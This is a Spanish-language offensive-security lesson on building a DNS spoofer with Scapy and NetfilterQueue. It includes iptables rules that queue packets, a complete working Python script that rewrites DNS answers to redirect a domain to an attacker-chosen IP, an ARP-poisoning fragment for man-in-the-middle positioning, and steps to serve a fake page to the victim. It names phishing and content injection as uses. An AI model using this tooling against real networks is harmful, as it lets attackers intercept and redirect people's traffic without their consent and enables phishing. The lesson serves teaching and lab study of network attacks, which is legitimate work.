
---- 
- TAG: #Construcción #DNS #Spoofer #Scapy #NetfilterQueue
----
En esta clase, vamos a crear un DNS Spoofer utilizando Scapy y NetfilterQueue. Este proyecto se centra en manipular las solicitudes DNS de una red para redirigir el tráfico a un destino elegido por nosotros, como atacantes.

La herramienta clave aquí es **iptables**, una utilidad de línea de comandos en sistemas Linux que permite configurar las reglas del firewall del sistema operativo. Usaremos iptables para redirigir todo el tráfico DNS (normalmente en el puerto 53) a una cola NFQUEUE. NFQUEUE es una funcionalidad de iptables que nos permite interceptar paquetes de la red, procesarlos con un programa externo (en este caso, nuestro DNS Spoofer creado con Scapy) y luego decidir si aceptarlos, descartarlos o modificarlos.

Al configurar iptables para enviar los paquetes DNS a NFQUEUE, podemos utilizar Scapy para inspeccionar y modificar estos paquetes. Por ejemplo, cuando la víctima intenta resolver un dominio, podemos cambiar la respuesta para que la IP resuelta sea la nuestra, no la legítima. Esto permite realizar ataques de tipo Man-In-The-Middle, donde redirigimos al usuario a un servidor bajo nuestro control en lugar del servidor real, lo que puede ser utilizado para una variedad de propósitos maliciosos, como phishing o inyección de contenido.

Esta clase te brindará una comprensión profunda y habilidades prácticas en la manipulación del tráfico de red y en la ejecución de ataques de spoofing DNS, una técnica poderosa en el arsenal de ciberseguridad ofensiva.

---

### Ejercicio: DNS Spoofing con `netfilterqueue`

En este ejercicio, aprenderemos a realizar un ataque de **DNS Spoofing** utilizando la herramienta `netfilterqueue`, la cual nos permitirá manipular paquetes de red para redirigir solicitudes DNS a un servidor falso controlado por nosotros.

#### ¿Qué es `netfilterqueue`?

`netfilterqueue` es una biblioteca que permite que aplicaciones Python interactúen con los paquetes IP que el sistema está manejando mediante el marco de filtrado de paquetes de Linux llamado **Netfilter**. Netfilter es el subsistema de Linux que maneja la manipulación de paquetes de red. Esta herramienta nos será útil para interceptar y modificar paquetes, lo que es fundamental para realizar ataques como el DNS Spoofing.

#### Configuración de las reglas de iptables

Antes de comenzar con el script, necesitamos redirigir los paquetes que recibimos a la cola de procesamiento de `netfilterqueue` para que puedan ser interceptados y manipulados. Esto se logra configurando reglas en **iptables**.

1. **Redirigir paquetes a la cola de Netfilter**:
   
   Para capturar los paquetes entrantes (como las solicitudes DNS), los redirigimos a la cola 0 de Netfilter con el siguiente comando:
   
   ```bash
   iptables -I INPUT -j NFQUEUE --queue-num 0
   ```

   Esta regla le indica a iptables que inserte todos los paquetes de entrada en la cola número 0 de Netfilter.

2. **Permitir el reenvío de paquetes**:
   
   Si estamos realizando un ataque de envenenamiento ARP (que es necesario para los ataques MITM), también necesitaremos permitir que los paquetes se reenvíen a través de nuestra máquina, para lo cual cambiamos la política de reenvío en iptables:
   
   ```bash
   iptables --policy FORWARD ACCEPT
   ```

---

### Instalación de `netfilterqueue`

Antes de poder escribir y ejecutar nuestro script, debemos instalar la biblioteca `netfilterqueue`:

```bash
pip3 install netfilterqueue
```

---

### Creación del script `dns_spoof.py`

Ahora, crearemos un script que nos permitirá interceptar paquetes DNS y redirigir solicitudes específicas a la IP de nuestra máquina.

1. **Crear el archivo `dns_spoof.py`**:
   
   Utilizaremos las bibliotecas `netfilterqueue` y `scapy` para este script. El propósito es interceptar solicitudes DNS y modificar las respuestas, de modo que cuando la víctima trate de acceder a un dominio específico, como "hack4.io", se le redirija a una dirección IP falsa (nuestra IP o cualquier IP que especifiquemos).

   El código del script es el siguiente:

```python
#!/usr/bin/python3

import netfilterqueue
import scapy.all as scapy
import signal
import sys

# Función para manejar la interrupción del script (Ctrl+C)
def def_handler(sig, frame):
    print(f"\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Función para procesar los paquetes interceptados
def process_packet(packet):
    # Convertimos el paquete de la cola en un paquete Scapy
    scapy_packet = scapy.IP(packet.get_payload())

    # Verificamos si el paquete contiene una respuesta DNS
    if scapy_packet.haslayer(scapy.DNSRR):
        # Extraemos el nombre de la consulta DNS
        qname = scapy_packet[scapy.DNSQR].qname

        # Si el dominio solicitado es "hack4.io", lo envenenamos
        if b"hack4.io" in qname:
            print(f"\n[+] Envenenando el dominio hack4.io")

            # Modificamos la respuesta DNS para redirigir a la IP 1.2.3.4
            answer = scapy.DNSRR(rrname=qname, rdata="1.2.3.4")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Eliminamos los campos de longitud y checksum para que Scapy los recalculen
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Configuramos el nuevo payload del paquete
            packet.set_payload(bytes(scapy_packet))

    # Aceptamos el paquete para que continúe su curso
    packet.accept()

# Vinculamos la cola 0 de Netfilter a nuestra función process_packet
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

### Explicación del código:

- **Importaciones**: 
  - `netfilterqueue`: Para manejar las colas de paquetes en Netfilter.
  - `scapy.all`: Para manipular y analizar los paquetes interceptados.
  - `signal`: Para capturar la señal de interrupción (Ctrl+C) y salir del script de manera controlada.
  - `sys`: Para manejar la salida del script.

- **Función `def_handler`**:
  Esta función maneja la señal de interrupción (Ctrl+C) y permite salir del script de forma limpia.

- **Función `process_packet`**:
  Esta es la función clave. Convierte el paquete interceptado en un paquete Scapy para poder analizarlo y modificarlo. Si el paquete es una respuesta DNS y el dominio solicitado es "hack4.io", modifica la respuesta para redirigirla a la IP especificada ("1.2.3.4" en este caso). Luego, recalcula los valores de longitud y checksum antes de aceptar el paquete y dejar que continúe su curso.

---

### Prueba del ataque DNS Spoofing

1. **Ejecutar el script `dns_spoof.py`**:
   
   Para iniciar el ataque, ejecutamos el script desde la terminal:
   
   ```bash
   python3 dns_spoof.py
   ```

   Este script ahora estará interceptando todas las solicitudes DNS entrantes que coincidan con el dominio "hack4.io" y redirigiendo la respuesta a la IP especificada.

2. **Probar la redirección con `ping`**:
   
   Para verificar que el ataque está funcionando, podemos realizar un ping al dominio "hack4.io" desde la máquina víctima:
   
   ```bash
   ping -c 1 hack4.io
   ```

   La respuesta del ping debería mostrar la IP a la que hemos redirigido el tráfico (en este caso, "1.2.3.4").

---

### Envenenamiento ARP para Man-in-the-Middle

Para que el DNS Spoofing funcione correctamente, necesitamos asegurarnos de que el tráfico de la víctima pase por nuestra máquina. Para ello, realizamos un ataque de envenenamiento ARP.

1. **Script de envenenamiento ARP (`arp_spoof.py`)**:

   Podemos utilizar un script de envenenamiento ARP como el siguiente, que redirige el tráfico de la víctima a través de nuestra máquina:

   ```python
   import scapy.all as scapy

   def spoof(target_ip, spoof_ip):
       packet = scapy.ARP(op=2, pdst=target_ip, hwdst="MAC Address", psrc=spoof_ip)
       scapy.send(packet, verbose=False)
   ```

2. **Ejecutar el ataque de envenenamiento ARP**:

   Para realizar el envenenamiento ARP, ejecutamos el siguiente comando:

   ```bash
   python3 arp_spoof.py -t 192.168.1.2
   ```

   Esto redirigirá el tráfico de la víctima a través de nuestra máquina.

---

### Montar un servidor HTTP para servir contenido falso

Podemos crear un archivo `index.html` que contendrá la página falsa que queremos mostrar a la víctima:

1. **Crear el archivo `index.html`**:

   ```bash
   nvim index.html
   ```

   Contenido de `index.html`:

   ```html
   Hacked ;)
   ```

2. **Levantar un servidor HTTP**:

   Para servir la página, levantamos un servidor HTTP en el puerto 80:

   ```bash
   python3 -m http.server 80
   ```

3. **Probar la redirección con `curl`**:

   Desde la máquina víctima, hacemos una solicitud al dominio "hack4.io" usando `curl`:

   ```bash
   curl hack4.io
   ```

   La respuesta debería mostrar el contenido del archivo `index.html`:

   ```bash
   Hacked ;)
   ```

---

### Conclusión

Con este ejercicio, hemos logrado interceptar y manipular paquetes DNS utilizando `netfilterqueue`, y redirigir solicitudes a una página controlada por nosotros mediante un ataque de envenenamiento ARP y DNS Spoofing. Esta técnica es extremadamente poderosa en un ataque de Man-in-the-Middle y demuestra cómo se puede manipular el tráfico en tiempo real.